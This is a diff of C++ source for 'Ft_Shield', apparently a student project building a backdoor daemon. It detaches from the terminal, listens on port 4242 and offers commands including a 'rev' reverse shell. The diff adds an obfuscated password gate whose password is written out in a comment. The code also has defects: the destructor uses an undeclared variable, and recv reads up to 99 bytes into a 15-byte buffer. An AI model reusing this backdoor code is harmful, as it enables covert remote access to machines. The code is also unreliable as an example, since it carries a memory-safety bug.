@@ -32,54 +32,71 @@
 /* Constructors ============================================================= */
 Ft_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _maxfd(2), _lockFile(-1), _logFile(-1), _nClients(0)
 {
-	sockaddr_in		&addrIn 	= *reinterpret_cast<sockaddr_in *>(&this->_addr);
+	sockaddr_in	&addrIn	= *reinterpret_cast<sockaddr_in *>(&this->_addr);
 
 	/* Define the server parameters */
 	addrIn.sin_family = AF_INET;
-	//addrIn.sin_addr.s_addr = INADDR_ANY;
-	addrIn.sin_addr.s_addr = inet_addr("127.147.6.1");
+	addrIn.sin_addr.s_addr = inet_addr("127.147.6.1");//INADDR_ANY to permit any local ipv4
 	addrIn.sin_port = htons(this->_port);
 
 	/* Map the commands into the command-mapper t_commands */
-	this->_cmdMap["shutdown\n"] = &Ft_Shield::_shutdown;
-	this->_cmdMap["rev\n"] = &Ft_Shield::_reverseShell;
-	this->_cmdMap["quit\n"] = &Ft_Shield::_disconnect;
-	this->_cmdMap["help\n"] = &Ft_Shield::_help;
+	this->_cmdMap["shutdown\n"]	= &Ft_Shield::_shutdown;
+	this->_cmdMap["rev\n"]		= &Ft_Shield::_reverseShell;
+	this->_cmdMap["quit\n"]		= &Ft_Shield::_disconnect;
+	this->_cmdMap["help\n"]		= &Ft_Shield::_help;
 	return;
 }
 
+/*
+ * Unused and useless, just here to have the Copernic form
+ */
 Ft_Shield::Ft_Shield(const Ft_Shield &shield) : _port(shield._port), _MaxClients(shield._MaxClients)
 {
 	return;
 }
 
 /* Destructor =============================================================== */
+/*
+ * Close all fd > 2
+ * Delete the DAEMON_LOCK_FILE
+ * Preserve the log file
+ */
 Ft_Shield::~Ft_Shield(void)
 {
-	/*
-	 * Close the lock file
-	 * Delete the lock file
-	 */
-	close(this->_lockFile);
+	this->_buffer = "You've been disconnected.\n";
+	for (int fd = 3; fd <= this->_maxfd; fd++)
+	{
+		send(client, this->_buffer.c_str(), this->_buffer.length(), 0);
+		close(fd);
+	}
 	remove(DAEMON_LOCK_FILE);
-	close(this->_logFile);
 	//remove(DAEMON_LOG_FILE);
 	return;
 }
 
 /* Operators ================================================================ */
+/*
+ * Unused and useless, just here to have the Copernic form
+ */
 Ft_Shield & Ft_Shield::operator=(const Ft_Shield & shield __attribute__((unused)))
 {
 	return *this;
 }
 
 /* Public member functions ================================================== */
+/*
+ * Two forks to detach from current process and from terminal
+ * Check if another instance is running
+ * Init and run the server
+ */
 void Ft_Shield::daemonize(void)
 {
 	int	pid		= 0;
 	char buf[9] = {'\0'};
 
 	std::cout << "halvarez" << std::endl;
+	/* Signal handler to ignore broken pipe signal in case of client brutal disconnection */
+
 	/* First fork to detach from the current processus */
 	pid = fork();
 	if (pid == -1)
@@ -103,7 +120,10 @@ void Ft_Shield::daemonize(void)
 			/* Open the log file and indentify the beginning of this instance */
 			this->_logFile = open(DAEMON_LOG_FILE, O_RDWR | O_CREAT | O_APPEND);
 			if (this->_logFile != -1)
+			{
 				write(this->_logFile, "New log instance:\n", 18);
+				this->_maxfd++;
+			}
 			/* 
 			 * Create a lock file
 			 * Open fails if the file already exists using this flags combination: O_CREAT | O_EXCL
@@ -113,6 +133,7 @@ void Ft_Shield::daemonize(void)
 			this->_lockFile = open(DAEMON_LOCK_FILE, O_RDWR | O_CREAT | O_EXCL);
 			if (this->_run == true && this->_lockFile != -1)
 			{
+				this->_maxfd++;
 				/* Write the daemon pid in the lock file */
 				sprintf(buf, "%d\n", getpid());
 				write(this->_lockFile, buf, strlen(buf));
@@ -120,8 +141,6 @@ void Ft_Shield::daemonize(void)
 				 if (this->_mkSrv() != -1)
 					 this->_runSrv();
 			}
-			else if (this->_run == false && this->_lockFile != -1)
-				close(this->_lockFile);
 		}
 	}
 	return;
@@ -190,6 +209,7 @@ int	Ft_Shield::_mkSrv(void)
 	this->_socket = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
 	if (this->_socket == -1)
 		return -1;
+	this->_maxfd++;
 	if (setsockopt(this->_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) == -1)
 		return -1;
 	if (bind(this->_socket, &this->_addr, sizeof(this->_addr)) == -1)
@@ -233,6 +253,13 @@ void	Ft_Shield::_runSrv(void)
 					this->_maxfd = client > this->_maxfd ? client : this->_maxfd;
 					this->_nClients++;
 					send(client, "Connected to ft_shield:\n", 24, 0);
+					if (this->_password(client) == -1)
+						this->_disconnect(client);
+					else
+					{
+						this->_buffer = "Password granted.\n";
+						send(client, this->_buffer.c_str(), this->_buffer.length(), 0);
+					}
 				}
 				else if (client != -1)
 				{
@@ -242,14 +269,13 @@ void	Ft_Shield::_runSrv(void)
 			}
 			if (FD_ISSET(fd, &read_set) && fd != this->_socket)
 			{
-				/* if res == 0 : disconnection case */
+				/*
+				 * if res == 0 : disconnection case
+				 * MSG_PEEK permits to read data without taking them off the queue
+				 */
 				res = recv(fd, char_buf, 99, MSG_PEEK);
 				if (res <= 0)
-				{
-					close(fd);
-					this->_maxfd = (fd == this->_maxfd) ? --this->_maxfd : this->_maxfd;
-					this->_nClients--;
-				}
+					this->_disconnect(fd);
 				else
 				{
 					res = recv(fd, char_buf, 99, 0);
@@ -326,6 +352,8 @@ void	Ft_Shield::_reverseShell(int fd)
  */
 void	Ft_Shield::_disconnect(int fd)
 {
+	this->_buffer = "You've been disconnected.\n";
+	send(fd, this->_buffer.c_str(), this->_buffer.length(), 0);
 	close(fd);
 	this->_maxfd = (fd == this->_maxfd) ? --this->_maxfd : this->_maxfd;
 	this->_nClients--;
@@ -333,7 +361,8 @@ void	Ft_Shield::_disconnect(int fd)
 }
 
 /*
- * Simple help menu associated to the ehlp command
+ * Simple help menu associated to the help command
+ * Should be a const function but isn't for compatibility with t_commands
  */
 void	Ft_Shield::_help(int fd)
 {
@@ -345,4 +374,56 @@ void	Ft_Shield::_help(int fd)
 	help += "\t- quit     : disconnect you from ft_shield\n";
 	send(fd, help.c_str(), help.length(), 0);
 	return;
+}
+
+/*
+ * Ask for password, wait 8s
+ * Calculation between values for obfuscation
+ * Password: P@ylo@d42\n\0
+ * The \n is due to the input in netcat
+ */
+int	Ft_Shield::_password(int fd)
+{
+	std::string	msg = "You have 8s to enter the password:\n";
+	char		char_buf[15] = {'\0'};
+	int			res = 0;
+
+	send(fd, msg.c_str(), msg.length(), 0);
+	sleep(8);
+	res = recv(fd, char_buf, 99, 0);
+	if (res <= 0)
+	{
+		msg = "Sorry, time elapsed.\n";
+		send(fd, msg.c_str(), msg.length(), 0);
+		return -1;
+	}
+	else
+	{
+		msg = char_buf;
+		if (msg[0] == 0x50 && msg[1] == msg[0] - 0x10 && msg[2] == msg[1] + 0x39)
+		{
+			if ((msg[4] - msg[3]) == 0x3 && msg[3] == 0x6c)
+			{
+				if (msg[1] == msg[5] && msg[1] + 0x24 == msg[6])
+				{
+					if (msg[8] == 0x32 && msg[7] == (msg[8] + 2) && (msg[9] - msg[10]) == 0xa)
+					{
+						if (msg[10] == 0)
+							return 0;
+						else
+							return -1;
+					}
+					else
+						return -1;
+				}
+				else
+					return -1;
+			}
+			else
+				return -1;
+		}
+		else
+			return -1;
+	}
+	return 0;
 }
